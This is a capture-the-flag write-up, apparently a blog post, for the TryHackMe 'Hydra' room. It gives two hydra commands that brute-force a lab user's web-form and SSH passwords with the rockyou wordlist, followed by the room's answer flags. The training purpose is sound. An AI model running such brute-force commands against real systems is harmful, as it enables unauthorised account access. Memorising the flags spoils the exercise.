@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>TryHackMe - Hydra</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe - Hydra | 0xskar</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="TryHackMe - Hydra" />
+<meta name="author" content="0xskar" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="https://tryhackme.com/room/hydra" />
+<meta property="og:description" content="https://tryhackme.com/room/hydra" />
+<link rel="canonical" href="http://localhost:4000/Hydra" />
+<meta property="og:url" content="http://localhost:4000/Hydra" />
+<meta property="og:site_name" content="0xskar" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-06-20T00:00:00-07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe - Hydra" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0xskar","url":"https://0xskar.github.io"},"dateModified":"2022-06-20T00:00:00-07:00","datePublished":"2022-06-20T00:00:00-07:00","description":"https://tryhackme.com/room/hydra","headline":"TryHackMe - Hydra","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Hydra"},"url":"http://localhost:4000/Hydra"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>0xskar@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>TryHackMe - Hydra</h2>
+  <time datetime="2022-06-20T00:00:00-07:00" class="by-line">20 Jun 2022</time>
+  <p><a href="https://tryhackme.com/room/hydra">https://tryhackme.com/room/hydra</a></p>
+
+<p>Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website’s credentials.</p>
+
+<p><img src="/assets/hydra.jpeg" alt="" /></p>
+
+<hr />
+
+<h2 id="task-1---hydra-introduction"><a href="#header-2"></a>Task 1 - Hydra Introduction</h2>
+
+<p>Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.</p>
+
+<p>For more information on the options of each protocol in Hydra, read the official Kali Hydra tool page: https://en.kali.tools/?p=220</p>
+
+<hr />
+
+<h2 id="task-2---using-hydra"><a href="#header-2"></a>Task 2 - Using Hydra</h2>
+
+<h5 id="answer-the-questions-below"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>Use Hydra to bruteforce molly’s web password. What is flag 1?</strong></p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">hydra -t 16 -l molly -P /usr/share/seclists/Passwords/rockyou.txt 10.10.84.248 http-post-form "/login:username=^USER^&amp;password=^PASS^:F=incorrect"</code></p>
+  </li>
+  <li>
+    <p>THM{2673a7dd116de68e85c48ec0b1f2612e}</p>
+  </li>
+</ul>
+
+<p><strong>Use Hydra to bruteforce molly’s SSH password. What is flag 2?</strong></p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">hydra -t 16 -l molly -P /usr/share/seclists/Passwords/rockyou.txt 10.10.84.248 ssh</code></p>
+  </li>
+  <li>
+    <p>THM{c8eeb0468febbadea859baeb33b2541b}</p>
+  </li>
+</ul>
+
+<hr />
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>0xskar</b>
+    </span>
+    
+    <span>© 2022</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
